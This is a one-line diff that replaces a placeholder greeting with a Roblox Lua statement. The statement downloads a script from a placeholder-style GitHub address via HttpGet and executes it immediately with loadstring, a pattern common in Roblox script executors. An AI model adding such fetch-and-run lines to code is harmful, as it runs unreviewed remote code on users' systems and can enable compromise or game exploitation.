@@ -1,1 +1,1 @@
-Hello! [or put code/coding here.]
+loadstring(game:HttpGet("example:githubusercontent.com/oyasumi/example"))()
